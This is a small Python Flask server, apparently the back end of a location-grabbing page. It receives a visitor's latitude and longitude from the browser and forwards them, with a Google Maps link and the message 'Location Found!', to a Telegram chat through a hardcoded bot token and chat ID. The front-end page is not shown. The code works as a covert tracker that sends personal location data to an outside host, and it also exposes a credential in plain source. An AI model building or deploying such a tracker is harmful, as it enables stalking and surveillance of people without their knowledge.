from flask import Flask, render_template, request, jsonify
import os
import requests

app = Flask(__name__)

BOT_TOKEN = "8517364051:AAFUprGh5hLgl0lvl1PUWiPxGXsu6D8gQY0"
CHAT_ID = "8450988216"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    log_message = f"📍 Location Found!\n\nLat: {lat}\nLon: {lon}\n\nMaps: {maps_link}"
    send_telegram_message(log_message)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
